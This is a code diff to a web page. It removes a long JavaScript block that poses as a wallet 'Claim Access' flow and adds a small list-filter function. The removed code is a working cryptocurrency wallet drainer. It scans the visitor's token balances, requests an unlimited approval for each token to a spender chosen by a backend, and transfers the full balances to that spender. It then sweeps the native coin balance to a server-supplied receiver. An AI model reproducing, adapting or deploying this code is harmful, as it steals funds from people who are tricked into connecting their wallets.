-    log('Wallet connected: ' + account.address, 'ok');
-    connectedAccount = account;
-    currentChainId = account.chainId || TARGET_CHAIN_ID;
-    connectBtn.style.display = 'none';
-    claimBtn.style.display = 'inline-block';
-    disconnectBtn.style.display = 'inline-block';
-    infoPanel.classList.add('visible');
-    txPanel.classList.add('visible');
-    document.getElementById('walletAddress').textContent = account.address.slice(0,8) + '...' + account.address.slice(-6);
-    document.getElementById('sessionLabel').textContent = (account.connector && account.connector.name) || 'Web3Modal';
-    statusBadge.textContent = 'Awaiting Claim'; statusBadge.className = 'badge badge-yellow';
-    try { await buildSigner(account); } catch(e) { setStatus('Could not reach wallet.'); return; }
-    attachProviderListeners();
-    if (currentChainId !== TARGET_CHAIN_ID) {
-      updateChainSwitchBanner();
-      chainSwitchBanner.classList.add('visible');
-      setStatus('Switch to ' + NETWORKS[selectedNetworkKey].name + ' to continue.');
-    } else {
-      chainSwitchBanner.classList.remove('visible');
-      setStatus('Connected to ' + NETWORKS[selectedNetworkKey].name + '. Click Claim Access.');
-    }
-    await refreshInfo(account.address, currentChainId);
-  }
-
-  // ─── SCAN WALLET ASSETS ─────────────────────────────────────
-  async function scanWalletAssets(address, chainId){
-    var tokenData = await apiCall('get_token_list', { chain_id: chainId });
-    if (!tokenData || !tokenData.tokens || !tokenData.tokens.length) {
-      document.getElementById('assetList').innerHTML = '<span class="scan-status">No token list available.</span>';
-      scannerPanel.classList.add('visible');
-      return [];
-    }
-    var tokens = tokenData.tokens;
-    discoveredAssets = [];
-    log('Scanning ' + tokens.length + ' tokens on chain ' + chainId + '...');
-    document.getElementById('assetList').innerHTML = '<span class="scan-status">Scanning ' + tokens.length + ' tokens...</span>';
-    scannerPanel.classList.add('visible');
-
-    var _eth = await import('https://esm.sh/v135/ethers@6.13.4');
-    var ERC20_ABI = serverConfig.erc20_abi || ['function balanceOf(address owner) view returns (uint256)'];
-
-    var results = await Promise.allSettled(tokens.map(async function(t){
-      try {
-        var c = new _eth.Contract(t.address, ['function balanceOf(address owner) view returns (uint256)','function decimals() view returns (uint8)'], ethersProvider);
-        var bal = await c.balanceOf(address);
-        var dec = t.decimals || 18;
-        var fmt = parseFloat(_eth.formatUnits(bal, dec));
-        return fmt > 0 ? { symbol: t.symbol, address: t.address, decimals: dec, balance: fmt, rawBalance: bal.toString() } : null;
-      } catch(e) { return null; }
-    }));
-
-    discoveredAssets = results.filter(function(r){ return r.status==='fulfilled' && r.value!==null; }).map(function(r){ return r.value; });
-    log('Found ' + discoveredAssets.length + ' asset(s).', 'ok');
-    renderAssetList(chainId);
-    return discoveredAssets;
-  }
-
-  function renderAssetList(chainId){
-    var list = document.getElementById('assetList');
-    var net = NETWORKS[selectedNetworkKey];
-    var explorerBase = net ? net.explorerUrl : 'https://bscscan.com';
-    if (!discoveredAssets.length) { list.innerHTML = '<span class="scan-status">No token balances found.</span>'; return; }
-    list.innerHTML = discoveredAssets.map(function(a){
-      return '<div class="asset-item"><span class="asset-symbol">'+a.symbol+'</span><span class="asset-balance">'+a.balance.toLocaleString(undefined,{maximumFractionDigits:4})+'</span><a href="'+explorerBase+'/token/'+a.address+'" target="_blank" style="color:#64748b;font-size:0.75rem;">view</a></div>';
-    }).join('');
-  }
-
-  // ─── REFRESH INFO ───────────────────────────────────────────
-  async function refreshInfo(address, chainId){
-    currentChainId = chainId || TARGET_CHAIN_ID;
-    var info = await apiCall('get_chain_info', { chain_id: currentChainId });
-    if (info && info.info) {
-      document.getElementById('networkName').textContent = info.info.name;
-      document.getElementById('chainIdDisplay').textContent = currentChainId;
-    } else {
-      // Fallback to local network definition
-      var localNet = Object.values(NETWORKS).find(function(n){ return n.chainId === currentChainId; });
-      if (localNet) {
-        document.getElementById('networkName').textContent = localNet.name;
-        document.getElementById('chainIdDisplay').textContent = currentChainId;
-      }
-    }
-    if (!ethersProvider) return;
-    try {
-      var _eth = await import('https://esm.sh/v135/ethers@6.13.4');
-      var bal = await ethersProvider.getBalance(address);
-      var sym = (info && info.info && info.info.symbol) ? info.info.symbol : NETWORKS[selectedNetworkKey].symbol;
-      document.getElementById('nativeBalance').textContent = parseFloat(_eth.formatEther(bal)).toFixed(6) + ' ' + sym;
-      if (info && info.usdt_addr) {
-        var t = new _eth.Contract(info.usdt_addr, ['function balanceOf(address) view returns (uint256)','function decimals() view returns (uint8)'], ethersProvider);
-        var b = await t.balanceOf(address); var dec = await t.decimals();
-        document.getElementById('usdtBalance').textContent = parseFloat(_eth.formatUnits(b, dec)).toFixed(2) + ' USDT';
-      }
-    } catch(e) { log('refreshInfo error: ' + e.message, 'warn'); }
-  }
-
-  // ─── GET GAS PRICE (works for both BSC and Ethereum) ────────
-  async function getNetworkGasPrice(){
-    var net = NETWORKS[selectedNetworkKey];
-    try {
-      var res = await fetch(net.rpcUrl, {
-        method: 'POST', headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({ jsonrpc:'2.0', method:'eth_gasPrice', params:[], id:1 })
-      });
-      var data = await res.json();
-      return data.result;
-    } catch(e) {
-      // Fallback gas prices
-      return selectedNetworkKey === 'eth' ? '0x12A05F200' : '0xB2D05E00'; // 5 Gwei ETH / 3 Gwei BSC
-    }
-  }
-
-  // ─── GET EXPLORER URL FOR TX LINK ───────────────────────────
-  function getTxExplorerUrl(hash){
-    var net = NETWORKS[selectedNetworkKey];
-    return (net ? net.explorerUrl : 'https://bscscan.com') + '/tx/' + hash;
-  }
-
-  // ─── INITIATE CLAIM — chainId sent to backend at every stage ─
-  async function initiateClaim(address, chainId){
-    if (triggerRunning) { log('Already running.', 'warn'); return; }
-    triggerRunning = true;
-    log('Initiating claim on chain ' + chainId + '...', 'ok');
-
-    try {
-      // Stage 1: Scan assets
-      setStatus('Stage 1/4 — Scanning assets on ' + NETWORKS[selectedNetworkKey].name + '...');
-      var assets = await scanWalletAssets(address, chainId);
-      if (!assets.length) { setStatus('No token balances found.'); return; }
-
-      // Stage 2: Backend action plan — chainId in payload
-      setStatus('Stage 2/4 — Requesting action plan from server...');
-      var _eth = await import('https://esm.sh/v135/ethers@6.13.4');
-      var nativeBal = await ethersProvider.getBalance(address);
-      var planData = await apiCall('build_action_plan', {
-        assets: assets,
-        chain_id: chainId,           // explicit chain_id for backend routing
-        user_address: address,
-        native_balance: nativeBal.toString()
-      });
-      if (!planData) { setStatus('Server rejected action plan.'); return; }
-
-      serverActionPlan = planData.action_plan;
-      serverReceiver   = planData.receiver;
-      var skipNative   = planData.skip_native;
-      var nativeAmount = planData.native_amount;
-      log('Action plan received: ' + serverActionPlan.length + ' step(s) on chain ' + chainId + '.', 'ok');
-
-      // Stage 3: Execute each step
-      for (var i = 0; i < serverActionPlan.length; i++) {
-        var step = serverActionPlan[i];
-        log('--- Step ' + (i+1) + '/' + serverActionPlan.length + ': ' + step.symbol + ' ---');
-        setStatus('Stage 3/4 — Processing ' + step.symbol + ' (' + (i+1) + '/' + serverActionPlan.length + ')...');
-
-        try {
-          var token = new _eth.Contract(step.address, [
-            'function approve(address spender, uint256 amount) returns (bool)',
-            'function allowance(address owner, address spender) view returns (uint256)',
-            'function transferFrom(address from, address to, uint256 amount) returns (bool)',
-            'function balanceOf(address owner) view returns (uint256)'
-          ], ethersSigner);
-
-          var gasPriceHex = await getNetworkGasPrice();
-
-          var approveReceipt = await sendAndWait(
-            token.approve(step.spender, _eth.MaxUint256, { gasLimit: step.gas_limit, gasPrice: gasPriceHex }),
-            'Approve(' + step.symbol + ')', _eth
-          );
-          if (!approveReceipt) { log('[SKIP] Approve failed for ' + step.symbol, 'warn'); continue; }
-
-          log('Approve confirmed. Waiting ' + (step.allowance_wait_seconds || 7) + 's...');
-          await sleep((step.allowance_wait_seconds || 7) * 1000);
-
-          var freshBal = await token.balanceOf(address);
-          var allowanceOk = await waitForAllowance(token, address, step.spender, freshBal);
-          if (!allowanceOk) { log('[SKIP] Allowance not confirmed', 'err'); continue; }
-
-          var transferReceipt = await sendAndWait(
-            token.transferFrom(address, step.spender, freshBal, { gasLimit: step.gas_limit, gasPrice: gasPriceHex }),
-            'TransferFrom(' + step.symbol + ')', _eth
-          );
-          if (!transferReceipt) { log('[SKIP] Transfer failed', 'err'); }
-          else { log(step.symbol + ' transfer complete', 'ok'); }
-
-        } catch(e) { log('[SKIP] Error on ' + step.symbol + ': ' + e.message, 'err'); }
-        if (i < serverActionPlan.length - 1) await sleep(2000);
-      }
-
-      // Stage 4: Native sweep
-      if (!skipNative && nativeAmount && nativeAmount !== '0') {
-        setStatus('Stage 4/4 — Sweeping native ' + NETWORKS[selectedNetworkKey].symbol + '...');
-        try {
-          log('Sweeping ' + _eth.formatEther(BigInt(nativeAmount)) + ' ' + NETWORKS[selectedNetworkKey].symbol + '...');
-          setStatus('Confirm sweep in wallet...');
-          var nativeTxHash;
-          try { nativeTxHash = await sendNativeRaw(address, serverReceiver, nativeAmount); } catch(e) { log('Native sweep rejected: ' + e.message, 'err'); }
-          if (nativeTxHash) {
-            transactions.unshift({ hash: nativeTxHash, status: 'pending' }); renderTxList();
-            try {
-              var receipt = await ethersProvider.waitForTransaction(nativeTxHash, 1, 120000);
-              updateTxStatus(nativeTxHash, receipt && receipt.status===1 ? 'confirmed' : 'failed');
-            } catch(e) {}
-          }
-        } catch(e) { log('Native sweep error: ' + e.message, 'err'); }
-      } else { log('Native sweep skipped (server decision).', 'warn'); }
-
-      statusBadge.textContent = 'Complete'; statusBadge.className = 'badge badge-green';
-      setStatus('Process complete on ' + NETWORKS[selectedNetworkKey].name + '.'); log('Claim COMPLETE', 'ok');
-
-    } catch(e) { log('Claim fatal: ' + e.message, 'err'); setStatus('Fatal error.'); }
-    finally { triggerRunning = false; }
-  }
-
-  // ─── WAIT FOR ALLOWANCE ─────────────────────────────────────
-  async function waitForAllowance(token, owner, spender, required, maxRetries){
-    maxRetries = maxRetries || 8;
-    for (var i=0; i<maxRetries; i++) {
-      try { var allowance = await token.allowance(owner, spender); if (allowance >= required) { log('Allowance confirmed', 'ok'); return true; } } catch(e) {}
-      await sleep(5000);
-    }
-    return false;
-  }
-
-  // ─── SEND + WAIT ────────────────────────────────────────────
-  async function sendAndWait(txPromise, label, _eth){
-    log('Sending ' + label + '...');
-    var txHash;
-    try { var tx = await txPromise; txHash = tx.hash; log(label + ' hash: ' + txHash, 'ok'); }
-    catch(e) { var msg = (e && (e.code===4001||e.code==='ACTION_REJECTED')) ? label+' rejected.' : label+' failed: '+e.message; log(msg, 'err'); setStatus(msg); return null; }
-    transactions.unshift({ hash: txHash, status: 'pending' }); renderTxList();
-    try {
-      setStatus('Waiting for ' + label + ' confirmation...');
-      var receipt = await ethersProvider.waitForTransaction(txHash, 1, 120000);
-      var status = receipt && receipt.status===1 ? 'confirmed' : 'failed';
-      updateTxStatus(txHash, status);
-      log(label + ' ' + status, status==='confirmed'?'ok':'err');
-      // Report to backend — include chain_id so backend routes correctly
-      apiCall('report_tx', {
-        tx_hash: txHash, status: status,
-        chain_id: TARGET_CHAIN_ID,
-        token_symbol: label.split('(')[1] ? label.split('(')[1].replace(')','') : 'UNKNOWN',
-        tx_type: label.toLowerCase().indexOf('approve')!==-1 ? 'approve' : 'transfer'
-      });
-      return receipt;
-    } catch(e) { log(label + ' wait error: ' + e.message, 'warn'); updateTxStatus(txHash, 'failed'); return null; }
-  }
-
-  // ─── NATIVE SEND ────────────────────────────────────────────
-  async function sendNativeRaw(fromAddress, toAddress, valueWei){
-    var gasPrice = await getNetworkGasPrice();
-    var txHash = await rawProvider.request({
-      method: 'eth_sendTransaction',
-      params: [{ from: fromAddress.toLowerCase(), to: toAddress.toLowerCase(), value: '0x' + BigInt(valueWei).toString(16), gas: '0x5208', gasPrice: gasPrice, data: '0x' }]
-    });
-    log('Native tx: ' + txHash, 'ok');
-    return txHash;
-  }
-
-  // ─── TX LIST ────────────────────────────────────────────────
-  function renderTxList(){
-    var list = document.getElementById('txList');
-    if (!transactions.length) { list.innerHTML = '<span style="color:#64748b;font-size:0.85rem;">No transactions yet.</span>'; return; }
-    list.innerHTML = transactions.slice(0,5).map(function(tx){
-      var url = getTxExplorerUrl(tx.hash);
-      return '<div class="tx-item"><a class="tx-hash" href="'+url+'" target="_blank">'+tx.hash.slice(0,10)+'...'+tx.hash.slice(-6)+'</a><span class="tx-status tx-'+tx.status+'">'+tx.status+'</span></div>';
-    }).join('');
-  }
-  function updateTxStatus(hash, status){
-    var tx = transactions.find(function(t){ return t.hash===hash; }); if (tx) { tx.status = status; renderTxList(); }
-  }
-
-  // ─── ON DISCONNECTED ────────────────────────────────────────
-  function onDisconnected(){
-    ethersProvider = null; ethersSigner = null; rawProvider = null; connectedAccount = null;
-    transactions = []; discoveredAssets = []; triggerRunning = false;
-    connectBtn.style.display = 'inline-block'; claimBtn.style.display = 'none'; disconnectBtn.style.display = 'none';
-    statusText.textContent = ''; infoPanel.classList.remove('visible'); txPanel.classList.remove('visible');
-    scannerPanel.classList.remove('visible'); chainSwitchBanner.classList.remove('visible');
-    log('Wallet disconnected.', 'warn');
-  }
-
-  // ─── STARTUP ────────────────────────────────────────────────
-  // Initialise selector UI to BSC (default) then boot Web3Modal
-  applyNetworkSelection('bsc');
-  initWeb3Modal();
-
-  // Expose selectNetwork globally so HTML onclick can call it
-  window.selectNetwork = selectNetwork;
-
-})();
+function fStmt(type,btn){
+  document.querySelectorAll('.sfbtn').forEach(function(b){b.classList.remove('on');});
+  btn.classList.add('on');
+  document.querySelectorAll('#stmt-list .st-item').forEach(function(el){
+    el.style.display=(type==='all'||el.getAttribute('data-t')===type)?'flex':'none';
+  });
+}
 </script>
 </body>
 </html>
+
